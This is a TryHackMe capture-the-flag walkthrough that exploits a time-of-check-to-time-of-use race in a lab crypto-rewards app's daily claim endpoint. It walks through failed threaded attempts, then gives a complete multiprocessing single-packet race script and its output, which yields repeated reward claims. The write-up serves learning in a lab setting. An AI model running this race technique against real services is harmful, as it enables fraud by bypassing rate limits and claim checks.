# TryHackMe: Towel on the Sunbed — Walkthrough

**Room:** Towel on the Sunbed (Hacker Holidays — Day 08, The Byte Lotus Hotel)
**Category:** Web Exploitation — Business Logic Abuse
**Difficulty:** Medium

Ponzi set his towel down for one 24-hour reward claim. He came back to find the sunbed had been "claimed" three times over while he wasn't looking.

---

## 1. Reading the Room Briefing First

> "Ponzi found the resort's wellness portal running a little side project called Ponzi — a crypto rewards app, poolside edition. He set his towel down, claimed his daily reward, and went to reapply sunscreen. He came back to find the sunbed had been 'claimed' three times over while he wasn't looking. He's convinced the app owes him a spot in the Whale Vault. The app disagrees, politely, once every 24 hours. Somewhere between his request and the server's clock, there's a gap wide enough to walk a whale through."

Plus a bonus in-universe hint from the room's fake social post:

> *"ponzi guy has been refreshing his dashboard for an HOUR waiting on this timer 💀 bro really thinks the clock is the only thing checking him"*

Both of these point at the same thing: **a race condition in the daily-claim logic**. "Claimed three times over while he wasn't looking" and "the clock is the only thing checking him" both describe a **TOCTOU bug** (time-of-check to time-of-use) — the server checks "has enough time passed since the last claim?" and only *afterward* updates the record of when the last claim happened. If multiple requests hit the server in that gap, more than one can pass the check before any of them commits the update.

This is a **Web Exploitation / Business Logic Abuse** room, not a memory-corruption or injection bug — the vulnerability is entirely in the *order and timing* of otherwise-correct-looking application logic.

## 2. Mapping the App

The target is a small Express app called **Ponzi Portfolio** ("Stack your bags. Claim your yield.") running on port `3000`.

### 2.1 Registering an account

```bash
curl -s -X POST http://<TARGET_IP>:3000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"cyb3rleo","password":"password123"}'
```
```json
{"message":"Account created.","redirect":"/dashboard"}
```

The response sets a `connect.sid` session cookie (standard `express-session`), which authenticates all subsequent requests.

### 2.2 Understanding the reward mechanism

Reading `/js/dashboard.js` (served in plain text, no build step to strip comments or logic) laid out the entire client-side flow:

- `GET /dashboard/api/me` returns the account state:
  ```json
  {
    "balance": 0,
    "tier": "Shrimp",
    "whaleThreshold": 150,
    "canClaim": true,
    "secondsUntilClaim": 0
  }
  ```
- `POST /claim` — the daily reward claim. Success looks like:
  ```json
  {"message":"Staking reward claimed successfully.","reward":50,"newBalance":50,"tier":"Shrimp","priceSnapshot":4.2}
  ```
- **`WHALE_THRESHOLD = 150`** — reach 150 PONZI to unlock the **Whale Vault**.
- Each claim awards a fixed **50 PONZI**, gated to once per 24 hours (`canClaim` / `secondsUntilClaim`).
- `GET /vault` — returns the flag once balance ≥ 150.

The math is simple: **50 PONZI per claim × 150 threshold = 3 successful claims needed**, but the app is designed to only allow **one claim per account per 24 hours**. Waiting three real days obviously isn't the intended solution for a 45-minute room — the intended path is squeezing 3+ claims out of the *same* 24-hour window via the race condition the briefing described.

## 3. First Attempts — Why Naive Concurrency Failed

It's worth walking through the failed attempts here, because each one teaches something about what "concurrent" actually means at the OS/network level — and because race-condition exploitation is one of the few bug classes where a "reasonable-looking" first attempt reliably fails.

### Attempt 1 — Threaded `requests.Session`

```python
import requests
import concurrent.futures

session = requests.Session()
session.post(f"{BASE}/auth/register", json={"username": "racer1", "password": "password123"})

def fire_claim():
    return session.post(f"{BASE}/claim")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(fire_claim) for _ in range(20)]
    results = [f.result() for f in futures]
```

**Result: 1 win out of 20.** Effectively no race at all — the server processed the claims sequentially as if we'd sent them one at a time.

**Why this failed:** Python's GIL means threads take turns executing Python bytecode; combined with per-request connection setup and `requests`' internal overhead, the 20 "concurrent" requests actually left our machine spread across a noticeable window of time — plenty long enough for Node's single-threaded event loop to fully process each claim (check, then write) before the next one arrived.

### Attempt 2 — The single-packet technique, sent in a loop

The standard technique for reliably exploiting race conditions (popularized by PortSwigger/James Kettle's research) is the **single-packet attack**: pre-open every TCP connection and send the entire request *except the very last byte*, holding each connection right on the edge of "complete." Then fire that final byte for every connection in one tight burst. This way, all requests arrive at the server within microseconds of each other, rather than being staggered by connection setup time.

```python
sockets = []
for req in full_reqs:
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.sendall(req[:-1])   # everything except the last byte
    sockets.append((sock, req[-1:]))

for sock, last_byte in sockets:
    sock.sendall(last_byte)  # release them all, back to back
```

**Result: 2 wins out of 20.** Better — real improvement over attempt 1 — but still not enough to clear the 150 threshold in one race window.

### Attempt 3 — Single-packet + `threading.Barrier`

Suspecting the sequential Python `for` loop firing the final bytes still had enough inter-iteration delay to matter, the next version used a `threading.Barrier(N)` so every thread blocks until *all* threads are ready, then releases its final byte at (as close to) the same instant as possible:

```python
barrier = threading.Barrier(N)

def fire(i, sock, last_byte):
    barrier.wait()          # block until every thread has arrived here
    sock.sendall(last_byte)
    ...

threads = [threading.Thread(target=fire, args=(i, sock, lb)) for i, (sock, lb) in enumerate(sockets)]
```

**Result: still 2 wins out of 20** (and reproducibly so across separate runs) — a strong signal the race window itself is small and *consistent*, but that threads still weren't synchronized tightly enough to reliably land more than 2 requests inside it. The GIL means even the `sock.sendall()` calls across "different" threads are still serialized by the Python interpreter at a low level.

## 4. The Working Exploit — `multiprocessing` + a Process Barrier

The fix: stop fighting the GIL and sidestep it entirely by using **separate OS processes** instead of threads. Each process gets its own Python interpreter and its own GIL, so `sendall()` calls across processes are genuinely simultaneous at the OS scheduler level — not serialized by a single interpreter lock.

Combined with a much higher request count (`N = 150`) to maximize the odds of several requests landing inside the same narrow race window:

```python
import socket
import multiprocessing
import requests

HOST = "10.129.134.126"
PORT = 3000
USERNAME = "racer4"
PASSWORD = "password123"
N = 150  # more concurrent attempts = better odds of several landing inside the race window

def build_request(cookie):
    body = ""
    req = (
        f"POST /claim HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: {cookie}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{body}"
    )
    return req.encode()

def fire(cookie, barrier, result_queue, idx):
    req = build_request(cookie)
    sock = socket.create_connection((HOST, PORT), timeout=5)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # disable Nagle's algorithm - no send buffering delay
    sock.sendall(req[:-1])       # hold every connection one byte short of "complete"
    barrier.wait()                # block until every OS process has reached this point
    sock.sendall(req[-1:])        # release the final byte — as close to simultaneous as Python allows
    sock.settimeout(5)
    try:
        data = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        result_queue.put((idx, data.decode(errors="replace")))
    except socket.timeout:
        result_queue.put((idx, "TIMEOUT"))
    finally:
        sock.close()

if __name__ == "__main__":
    # Register a brand-new account so we start from a fresh, unclaimed state
    s = requests.Session()
    r = s.post(f"http://{HOST}:{PORT}/auth/register", json={"username": USERNAME, "password": PASSWORD})
    print("Register:", r.status_code, r.text)
    cookie_header = "; ".join(f"{k}={v}" for k, v in s.cookies.get_dict().items())

    me = s.get(f"http://{HOST}:{PORT}/dashboard/api/me").json()
    print("Pre-claim state:", me)

    barrier = multiprocessing.Barrier(N)
    result_queue = multiprocessing.Queue()

    # Spawning real OS processes bypasses the GIL entirely — each process
    # can send its final byte without waiting its turn for an interpreter lock.
    processes = [
        multiprocessing.Process(target=fire, args=(cookie_header, barrier, result_queue, i))
        for i in range(N)
    ]
    for p in processes:
        p.start()
    for p in processes:
        p.join()

    results = [None] * N
    while not result_queue.empty():
        idx, val = result_queue.get()
        results[idx] = val

    win_count = sum(1 for r in results if r and "200 OK" in r.split("\r\n")[0])
    print(f"\nTotal wins: {win_count}")

    me_after = s.get(f"http://{HOST}:{PORT}/dashboard/api/me").json()
    print("Post-race state:", me_after)
```

Run it:
```bash
python3 race_mp.py
```

**Result:**
```
Total wins: 13
Post-race state: {'balance': 700, 'tier': 'Whale', 'whaleThreshold': 150, 'canClaim': False, ...}
```

13 successful claims landed inside a single 24-hour claim window — 700 PONZI, tier **Whale**, comfortably clearing the 150 threshold.

## 5. Claiming the Vault

With balance ≥ 150, the `vault-btn` unlocks. Hitting the endpoint directly with the winning session's cookie:

```bash
curl -s http://<TARGET_IP>:3000/vault -b cookies.txt
```

```json
{
  "message": "Welcome to the Whale Vault.",
  "flag": "THM{...redacted...}",
  "balance": 700
}
```

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Recon | Read `/js/dashboard.js` (unminified, no build step) | Learned the exact claim/vault mechanics: 50 PONZI/claim, 150 needed, one claim per 24h |
| Attempt 1 | Threaded `requests.Session`, 20 concurrent claims | 1 win — GIL + connection overhead spread requests out too much |
| Attempt 2 | Single-packet attack, final bytes sent in a sequential loop | 2 wins — better, but loop iteration still introduced timing gaps |
| Attempt 3 | Single-packet + `threading.Barrier` | Still 2 wins — threads remain serialized by the GIL regardless of synchronization logic |
| **Working exploit** | Single-packet attack + `multiprocessing.Barrier`, N=150 real OS processes | **13 wins** → balance 700, tier Whale |
| Payoff | `GET /vault` with a winning session cookie | Flag retrieved |

**Key takeaway:** this room is really about *precision* in exploiting a race condition, not just "throwing concurrency at it." A naive threaded approach in Python will almost always undersell a genuine race condition, because the GIL and network-stack overhead reintroduce exactly the serialization the bug depends on being absent. The single-packet technique (pre-connect, hold one byte back, release together) closes the network-timing gap; switching from threads to processes closes the language-level gap. Both were necessary here — neither alone was enough.

*(Flag intentionally redacted from this writeup — run the exploit yourself against your own instance to retrieve it.)*
